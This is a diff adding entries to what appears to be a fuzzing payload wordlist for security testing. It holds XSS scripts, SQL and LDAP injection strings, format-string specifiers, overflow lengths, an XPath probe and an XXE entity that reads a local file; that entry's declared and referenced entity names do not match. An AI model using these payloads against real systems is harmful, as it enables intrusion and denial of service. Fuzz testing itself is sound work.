@@ -8,3 +8,24 @@ INSERT INTO mysql.user (user, host, password) VALUES ('name', 'localhost', PASSW
 GRANT CONNECT TO name; GRANT RESOURCE TO name;
 INSERT INTO Users(Login, Password, Level) VALUES( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70)
  + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)
+>"><script>alert("XSS")</script>&
+<IMG SRC="javascript:alert('XSS');">
+'';!--"<XSS>=&{()}
+A x 17
+A x 12288
+A x 1024
+%x%x%x%x
+%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%
+.1024d
+0x1000
+0xfffffffe
+-1
+%29
+%2A%28%7C%28mail%3D%2A%29%29
+%2A%28%7C%28objectclass%3D%2A%29%29
+'+or+'1'='1
+x'+or+1=1+or+'x'='y
+count(/child::node())
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('gotcha');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xee;</foo>
